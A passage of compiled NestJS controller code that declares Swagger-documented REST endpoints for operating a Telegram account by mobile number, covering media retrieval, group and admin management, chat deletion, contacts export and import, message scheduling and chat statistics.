    }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        description: 'Maximum number of messages to fetch (default: 50, max: 1000)',
        required: false,
        type: Number,
        example: 50
    }),
    (0, swagger_1.ApiQuery)({
        name: 'maxId',
        required: false,
        type: Number,
        description: 'Maximum message ID to include (use for pagination - get messages with ID less than this. Use nextMaxId from previous response for next page)',
        example: 12345
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minId',
        required: false,
        type: Number,
        description: 'Minimum message ID to include',
        example: 1000
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Media metadata retrieved successfully',
        type: Object
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Invalid request - invalid date format, chat ID, or limit value'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types', new common_1.ParseArrayPipe({ items: String, separator: ',', optional: true }))),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('maxId')),
    __param(7, (0, common_1.Query)('minId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Object, String, String, Number, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMediaMetadata", null);
__decorate([
    (0, common_1.Get)('media/filter/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get filtered media messages from a chat',
        description: 'Get filtered list of media messages with detailed metadata including thumbnails. Returns standardized paginated response. Use maxId for pagination (get messages with ID less than maxId).'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiQuery)({
        name: 'chatId',
        required: true,
        description: 'Chat ID or username. Use "me" for saved messages, channel username, or numeric ID',
        example: 'me'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'types',
        required: false,
        enum: ['photo', 'video', 'document', 'voice', 'all'],
        isArray: true,
        description: 'Filter by media types. Use "all" to get all types grouped by type. If not specified, returns all media types.',
        example: ['photo', 'video']
    }),
    (0, swagger_1.ApiQuery)({
        name: 'startDate',
        required: false,
        description: 'Filter media after this date (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',
        example: '2024-01-01'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'endDate',
        required: false,
        description: 'Filter media before this date (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',
        example: '2024-12-31'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        required: false,
        type: Number,
        description: 'Maximum number of media items to fetch (default: 50, max: 1000)',
        example: 50
    }),
    (0, swagger_1.ApiQuery)({
        name: 'maxId',
        required: false,
        type: Number,
        description: 'Maximum message ID to include (use for pagination - get messages with ID less than this. Use nextMaxId from previous response for next page)',
        example: 12345
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minId',
        required: false,
        type: Number,
        description: 'Minimum message ID to include',
        example: 1000
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Paginated media response with standardized format',
        type: Object
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Invalid request - invalid date format, chat ID, or limit value'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types', new common_1.ParseArrayPipe({ items: String, separator: ',', optional: true }))),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('maxId')),
    __param(7, (0, common_1.Query)('minId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Object, String, String, Number, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFilteredMedia", null);
__decorate([
    (0, common_1.Get)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get group members' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupMembers", null);
__decorate([
    (0, common_1.Post)('chat/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Block a chat/user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat/User ID to block', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "blockChat", null);
__decorate([
    (0, common_1.Delete)('chat/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete or clear a chat history for a user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the user whose chat should be deleted', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'peer', description: 'Username or Peer ID of the chat to delete', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, description: 'Delete messages with ID  maxId' }),
    (0, swagger_1.ApiQuery)({ name: 'justClear', required: false, description: 'Only clear history for this user', type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'revoke', required: false, description: 'Delete for everyone if possible', type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)' }),
    (0, swagger_1.ApiQuery)({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)' }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, delete_chat_dto_1.DeleteHistoryDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteChatHistory", null);
__decorate([
    (0, common_1.Get)('messages/inline/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send message with inline button' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'message', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'url', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('message')),
    __param(3, (0, common_1.Query)('url')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessageWithInlineButton", null);
__decorate([
    (0, common_1.Get)('dialogs/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all dialogs' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 }),
    (0, swagger_1.ApiQuery)({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 }),
    (0, swagger_1.ApiQuery)({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetId')),
    __param(3, (0, common_1.Query)('archived')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getAllDialogs", null);
__decorate([
    (0, common_1.Get)('last-active/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get last active time' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getLastActiveTime", null);
__decorate([
    (0, common_1.Post)('group/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new group with advanced options' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.createGroupDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.createGroupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createGroupWithOptions", null);
__decorate([
    (0, common_1.Post)('group/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update group settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupSettingsDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupSettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateGroupSettings", null);
__decorate([
    (0, common_1.Post)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add members to a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addGroupMembers", null);
__decorate([
    (0, common_1.Delete)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove members from a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "removeGroupMembers", null);
__decorate([
    (0, common_1.Post)('group/admin/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote or demote group admins' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.AdminOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "handleAdminOperation", null);
__decorate([
    (0, common_1.Post)('chat/cleanup/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Clean up chat history' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ChatCleanupDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ChatCleanupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "cleanupChat", null);
__decorate([
    (0, common_1.Get)('chat/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('period')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatStatistics", null);
__decorate([
    (0, common_1.Post)('messages/schedule/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Schedule a message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ScheduleMessageDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ScheduleMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "scheduleMessage", null);
__decorate([
    (0, common_1.Get)('messages/scheduled/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get scheduled messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getScheduledMessages", null);
__decorate([
    (0, common_1.Post)('media/voice/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send voice message',
        description: 'Send a voice message (audio file) to a chat. Maximum file size is 100MB. Duration is optional but recommended for better playback.'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                chatId: { type: 'string', description: 'Chat ID or username', example: 'me' },
                url: { type: 'string', description: 'URL of the voice file (must be accessible)', example: 'https://example.com/voice.ogg' },
                duration: { type: 'number', description: 'Duration in seconds (optional but recommended)', example: 30 },
                caption: { type: 'string', description: 'Optional caption for the voice message' }
            },
            required: ['chatId', 'url']
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Voice message sent successfully',
        type: Object
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Invalid request - missing chatId/url, file too large, or invalid URL'
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendVoiceMessage", null);
__decorate([
    (0, common_1.Post)('media/view-once/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a view once (disappearing) media message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiConsumes)('multipart/form-data', 'application/json'),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                chatId: { type: 'string', description: 'Chat ID to send the media to' },
                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },
                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },
                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },
                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },
                caption: { type: 'string', description: 'Optional caption for the media' },
                filename: { type: 'string', description: 'Optional filename for the media' }
            },
            required: ['chatId', 'sourceType']
        }
    }),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('binaryData', { storage: multer.memoryStorage() })),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.UploadedFile)()),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object, dto_1.ViewOnceMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendViewOnceMedia", null);
__decorate([
    (0, common_1.Get)('chat/history/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat history with metadata' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('offset')),
    __param(3, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatHistory", null);
__decorate([
    (0, common_1.Post)('group/admin/promote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote members to admin' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AdminOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "promoteToAdmin", null);
__decorate([
    (0, common_1.Post)('group/admin/demote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Demote admin to regular member' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupMemberOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "demoteAdmin", null);
__decorate([
    (0, common_1.Post)('group/unblock/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Unblock a user in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { groupId: { type: 'string' }, userId: { type: 'string' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "unblockGroupUser", null);
__decorate([
    (0, common_1.Get)('group/admins/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of group admins' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupAdmins", null);
__decorate([
    (0, common_1.Get)('group/banned/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of banned users in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupBannedUsers", null);
__decorate([
    (0, common_1.Post)('contacts/export/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Export contacts in vCard or CSV format' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactExportImportDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __param(2, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactExportImportDto, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "exportContacts", null);
__decorate([
    (0, common_1.Post)('contacts/import/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Import contacts from a list' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'array', items: { type: 'object', properties: { firstName: { type: 'string' }, lastName: { type: 'string' }, phone: { type: 'string' } } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Array]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "importContacts", null);
__decorate([
    (0, common_1.Post)('contacts/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Manage blocked contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactBlockListDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactBlockListDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "manageBlockList", null);
__decorate([
    (0, common_1.Get)('contacts/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get contact activity statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContactStatistics", null);
__decorate([
    (0, common_1.Post)('folders/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new chat folder' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: create_chat_folder_dto_1.CreateChatFolderDto }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, create_chat_folder_dto_1.CreateChatFolderDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createChatFolder", null);
__decorate([
    (0, common_1.Get)('folders/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all chat folders' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatFolders", null);
__decorate([
    (0, common_1.Put)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Edit message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { chatId: { type: 'string' }, messageId: { type: 'number' }, text: { type: 'string' }, media: { type: 'object', properties: { type: { type: 'string', enum: ['photo', 'video', 'document'] }, url: { type: 'string' } } } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "editMessage", null);
__decorate([
    (0, common_1.Post)('chat/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update chat settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { chatId: { type: 'string' }, title: { type: 'string' }, about: { type: 'string' }, photo: { type: 'string' }, slowMode: { type: 'number' }, linkedChat: { type: 'string' }, defaultSendAs: { type: 'string' }, username: { type: 'string' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateChatSettings", null);
__decorate([
    (0, common_1.Post)('media/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send multiple media files in batch' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { chatId: { type: 'string' }, media: { type: 'array', items: { type: 'object', properties: { type: { type: 'string', enum: ['photo', 'video', 'document'] }, url: { type: 'string' }, caption: { type: 'string' }, fileName: { type: 'string' } } } }, silent: { type: 'boolean' }, scheduleDate: { type: 'number' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaBatch", null);
__decorate([
    (0, common_1.Get)('security/2fa-status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Check if 2FA password is set' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "hasPassword", null);
__decorate([
    (0, common_1.Get)('chats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chats with advanced filtering' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'offsetDate', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'offsetId', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'offsetPeer', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'folderId', required: false, type: Number }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetDate')),
    __param(3, (0, common_1.Query)('offsetId')),
    __param(4, (0, common_1.Query)('offsetPeer')),
    __param(5, (0, common_1.Query)('folderId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Number, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChats", null);
__decorate([
    (0, common_1.Get)('file/url/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get downloadable URL for a file' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'url', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'filename', required: true }),
    (0, swagger_1.ApiResponse)({ type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('url')),
    __param(2, (0, common_1.Query)('filename')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFileUrl", null);
__decorate([
    (0, common_1.Get)('messages/stats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get message statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { chatId: { type: 'string' }, period: { type: 'string', enum: ['day', 'week', 'month'] }, fromDate: { type: 'string', format: 'date-time' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessageStats", null);
__decorate([
    (0, common_1.Get)('chats/top-private/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get top private chats with smart activity-based filtering',
        description: 'Retrieves top private chats ranked by engagement score using advanced filtering. ' +
            'Uses time-decay scoring, conversation patterns, and dialog metadata for accurate results. ' +
            'Considers recency, mutual engagement, reply chains, and call history. ' +
            'Supports configurable limit (default: 10, max: 50).'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        required: false,
        type: Number,
        description: 'Maximum number of top chats to return (default: 10, min: 1, max: 50)',
        example: 10
